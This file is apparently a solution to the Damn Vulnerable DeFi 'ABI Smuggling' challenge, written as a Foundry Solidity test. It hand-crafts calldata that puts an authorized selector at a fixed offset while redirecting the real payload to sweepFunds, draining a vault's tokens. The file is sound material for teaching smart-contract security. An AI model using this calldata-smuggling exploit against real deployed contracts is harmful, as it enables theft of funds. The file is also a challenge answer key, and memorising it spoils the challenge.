// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * =========================================================
     * SOLUTION - test_abiSmuggling()
     * =========================================================
     * Attack: calldata offset manipulation (ABI smuggling)
     * execute() reads the auth selector from a FIXED offset (byte 100),
     * assuming actionData always begins there. But actionData is `bytes
     * calldata` whose true location is set by an offset pointer we control.
     * 1. Put the player-authorized selector 0xd9caed12 (withdraw) at byte 100
     *    so the permissions check passes.
     * 2. Point the actionData offset further down to a payload encoding
     *    sweepFunds(recovery, token) (selector 0x85fb709d).
     * 3. execute() forwards that payload to the vault, draining all tokens.
     *
     * Single hand-crafted calldata; one player tx via address(vault).call.
     * =========================================================
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // The real action we want executed once the auth check is fooled.
        bytes memory sweepCall = abi.encodeWithSelector(
            vault.sweepFunds.selector, recovery, IERC20(address(token))
        );

        // Hand-build execute(address,bytes) calldata so that:
        //  - the actionData offset pointer = 0x80 (places its length word at byte 0x84)
        //  - byte 0x64 (100) holds the authorized withdraw selector 0xd9caed12
        //  - the real actionData payload is sweepFunds(recovery, token)
        bytes memory payload = abi.encodePacked(
            AuthorizedExecutor.execute.selector,        // [0x00] execute selector (4)
            bytes32(uint256(uint160(address(vault)))),  // [0x04] target = vault
            bytes32(uint256(0x80)),                     // [0x24] offset to actionData
            bytes32(0),                                 // [0x44] filler word
            bytes4(0xd9caed12),                         // [0x64] authorized selector (read by auth)
            bytes28(0),                                 // [0x68] pad rest of the word
            bytes32(sweepCall.length),                  // [0x84] actionData length
            sweepCall                                   // [0xa4] actionData = sweepFunds(recovery, token)
        );

        (bool ok,) = address(vault).call(payload);
        require(ok, "smuggled call failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
